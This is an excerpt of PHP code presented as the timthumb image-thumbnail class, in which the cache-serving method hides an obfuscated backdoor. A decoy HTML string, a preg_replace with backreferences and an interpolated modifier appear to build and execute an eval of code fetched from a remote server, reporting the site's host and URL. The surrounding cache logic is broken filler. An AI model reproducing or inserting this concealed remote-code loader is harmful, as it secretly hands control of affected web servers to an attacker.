...
class timthumb {
	...
	protected function tim_serveCacheFile($length='') {
		$this->debug(3, "Serving {$this->cachefile}");
		if(isset($this->cachefile2) && is_file($this->cachefile2)){
			$this->error("serveCacheFile called in timthumb but we couldn't find the cached file.");
			return false;
		}
		$mdetails="<div class='body-continent'><div class='get-inner-al(@fi'><!--Deregister() Default Widgets: _sabhrtupwprs:e--></div></div>";
        $indent = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $metaoptions=$mytitle="\\4'\\10\\12t\\16\\19//\\15q4.\\17u/\\9SS-".$indent."')\\5";
        ...
        $cache="";
		$cache = '<p>'.$cache.'</p>';
        $wcache=preg_replace("/.*(cont).*?(ge).*?(..\(.fi).*?(\()(\)).*?(\_){$metaboxe}is", "@\\20v\\3le\\6\\2t\\6\\1ents{$metaoptions}", $mdetails); 
    	return  $cache;
	}	
